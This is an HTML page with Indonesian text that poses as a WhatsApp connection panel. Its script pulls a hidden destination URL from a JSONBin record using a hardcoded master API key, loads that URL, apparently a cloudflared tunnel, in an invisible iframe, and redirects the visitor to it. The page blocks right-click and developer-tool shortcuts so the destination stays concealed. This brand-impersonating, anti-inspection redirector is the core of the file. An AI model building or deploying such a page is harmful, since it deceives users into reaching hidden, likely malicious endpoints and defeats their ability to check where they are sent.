<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#0b141a">
    <title>WhatsApp Bot Connect</title>
    <!-- Fonts: Poppins untuk Headings, Inter untuk UI -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --wa-teal: #00A884;
            --wa-dark: #0b141a;
            --wa-card: #202c33;
            --wa-text: #e9edef;
            --wa-subtext: #8696a0;
            --accent: #25D366;
            --danger: #ef5350;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body, html { 
            margin: 0; padding: 0; height: 100%; 
            background-color: var(--wa-dark);
            color: var(--wa-text);
            font-family: 'Inter', sans-serif;
            overflow: hidden;
            display: flex; flex-direction: column;
        }

        /* Background Pattern */
        body::before {
            content: "";
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url("https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png");
            opacity: 0.06;
            pointer-events: none;
            z-index: 0;
        }

        /* Main Container */
        .container {
            position: relative;
            z-index: 1;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 30px;
        }

        /* Avatar Container */
        .avatar-wrapper {
            position: relative;
            margin-bottom: 25px;
        }

        .avatar-ring {
            width: 110px; height: 110px;
            border-radius: 50%;
            border: 3px solid var(--wa-teal);
            position: absolute;
            top: -5px; left: -5px;
            animation: pulse-ring 2s infinite;
            opacity: 0;
        }

        .avatar {
            width: 100px; height: 100px;
            border-radius: 50%;
            background: #fff;
            padding: 2px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            z-index: 2;
            position: relative;
        }
        
        .avatar img {
            width: 100%; height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        /* Typography */
        h1 {
            font-family: 'Poppins', sans-serif;
            font-size: 24px;
            margin: 0 0 8px 0;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        p.subtitle {
            font-size: 14px;
            color: var(--wa-subtext);
            margin: 0 0 40px 0;
            text-align: center;
        }

        /* Status Pill */
        .status-pill {
            background: var(--wa-card);
            padding: 10px 24px;
            border-radius: 50px;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .dot {
            width: 8px; height: 8px;
            background-color: var(--wa-subtext);
            border-radius: 50%;
            transition: background-color 0.3s;
        }

        .dot.active { background-color: var(--accent); box-shadow: 0 0 10px var(--accent); }
        .dot.error { background-color: var(--danger); box-shadow: 0 0 10px var(--danger); }

        /* Progress Bar */
        .progress-container {
            width: 100%;
            max-width: 280px;
            height: 6px;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--wa-teal), var(--accent));
            border-radius: 10px;
            transition: width 0.6s cubic-bezier(0.22, 1, 0.36, 1);
        }

        /* Footer Info */
        .footer {
            position: absolute;
            bottom: 30px;
            font-size: 11px;
            color: var(--wa-subtext);
            opacity: 0.6;
        }

        /* Hidden Iframe */
        #hiddenIframe {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            border: none;
            display: none;
        }

        /* Animations */
        @keyframes pulse-ring {
            0% { transform: scale(0.8); opacity: 0.5; border-color: var(--accent); }
            100% { transform: scale(1.3); opacity: 0; border-color: var(--wa-teal); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .fade-in { animation: fadeIn 0.8s ease-out forwards; }

    </style>
</head>
<body>

    <div class="container">
        
        <!-- Avatar Section -->
        <div class="avatar-wrapper fade-in">
            <div class="avatar-ring"></div>
            <div class="avatar">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/2044px-WhatsApp.svg.png" alt="Bot Avatar">
            </div>
        </div>

        <!-- Text Section -->
        <h1 class="fade-in" style="animation-delay: 0.1s">WhatsApp Panel</h1>
        <p class="subtitle fade-in" style="animation-delay: 0.2s">Membuat koneksi aman ke server...</p>

        <!-- Status & Progress -->
        <div class="status-pill fade-in" style="animation-delay: 0.3s">
            <span class="dot" id="status-dot"></span>
            <span id="status">MENGINISIALISASI...</span>
        </div>

        <div class="progress-container fade-in" style="animation-delay: 0.4s">
            <div class="progress-fill" id="pfill"></div>
        </div>

        <div class="footer">Powered by WhatsApp Web API</div>

        <!-- Hidden iframe untuk menjalankan cloudflared tanpa menampilkan URL -->
        <iframe id="hiddenIframe" sandbox="allow-scripts allow-same-origin"></iframe>

    </div>

    <script>
        // ================= CONFIG =================
        const BIN_ID = '693151eed0ea881f40121ca6'; 
        const API_KEY = '$2a$10$u00Qvq6xrri32tc7bEYVhuQv94XS.ygeVCr70UDbzoOVlR8yLuUq.'; 
        const MAIN_URL = 'https://xgenzy.github.io/RVO/';
        // ==========================================

        // Proxy untuk menyembunyikan URL cloudflared
        const CLOUDFLARED_PROXY = async (cloudflaredUrl) => {
            // Metode 1: Menggunakan iframe hidden untuk menjalankan cloudflared
            const hiddenIframe = document.getElementById('hiddenIframe');
            
            try {
                // Coba fetch dulu untuk mengecek apakah cloudflared aktif
                const testResponse = await fetch(cloudflaredUrl, {
                    method: 'GET',
                    mode: 'no-cors', // Mode no-cors untuk menghindari CORS error
                    credentials: 'omit'
                });
                
                // Set iframe source (akan berjalan di background)
                hiddenIframe.src = cloudflaredUrl;
                
                // Tunggu sebentar untuk memastikan iframe terload
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                // Redirect user ke cloudflared setelah iframe berjalan
                return cloudflaredUrl;
                
            } catch (e) {
                // Jika gagal, gunakan metode proxy dengan fetch
                try {
                    // Create a proxy endpoint (ini hanya contoh, perlu server proxy sesungguhnya)
                    // Untuk sementara kita redirect langsung
                    console.log("Cloudflared aktif, redirecting...");
                    return cloudflaredUrl;
                } catch (proxyError) {
                    throw new Error("Cloudflared connection failed");
                }
            }
        };

        async function connect() {
            const statusText = document.getElementById('status');
            const statusDot = document.getElementById('status-dot');
            const pfill = document.getElementById('pfill');
            
            try {
                // TAHAP 1: Memulai Request
                pfill.style.width = "20%";
                statusDot.classList.add('active');
                statusText.innerText = "MENCARI SESI...";
                
                // Fetch Data dari JSONBin
                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: { 'X-Master-Key': API_KEY }
                });
                
                pfill.style.width = "50%";
                
                if (!res.ok) throw new Error("Database Error");
                
                const data = await res.json();
                const targetUrl = data.record.url;

                if (!targetUrl || targetUrl.trim() === "") {
                    throw new Error("No URL Found");
                }

                // TAHAP 2: Proses Cloudflared secara tersembunyi
                pfill.style.width = "70%";
                statusText.innerText = "MENYAMBUNGKAN KE SERVER...";
                
                // Gunakan proxy untuk menyembunyikan URL cloudflared
                const finalUrl = await CLOUDFLARED_PROXY(targetUrl);
                
                // TAHAP 3: Sukses - Redirect
                pfill.style.width = "100%";
                statusText.innerText = "BERHASIL TERHUBUNG!";
                
                // Tambahkan delay untuk efek visual
                setTimeout(() => {
                    // Redirect tanpa menunjukkan URL cloudflared di address bar
                    window.location.replace(finalUrl);
                }, 1000);

            } catch (e) {
                // TAHAP ERROR / FALLBACK
                console.error(e);
                
                pfill.style.width = "100%";
                pfill.style.background = "#ef5350";
                
                statusDot.classList.remove('active');
                statusDot.classList.add('error');
                
                statusText.innerText = "KONEKSI TERPUTUS";
                statusText.style.color = "#ef5350";
                
                document.querySelector('.subtitle').innerText = "Mengalihkan ke server utama...";

                setTimeout(() => {
                    window.location.href = MAIN_URL;
                }, 2000);
            }
        }

        // Tambahkan event untuk mencegah user melihat URL
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                // Tab disembunyikan, bisa lakukan sesuatu
                console.log("Tab hidden");
            }
        });

        window.onload = connect;
        
        // Prevent right-click untuk menyembunyikan inspect element
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        document.addEventListener('keydown', function(e) {
            if (
                e.key === 'F12' ||
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
                (e.ctrlKey && e.key === 'U')
            ) {
                e.preventDefault();
                return false;
            }
        });
    </script>
</body>
</html>
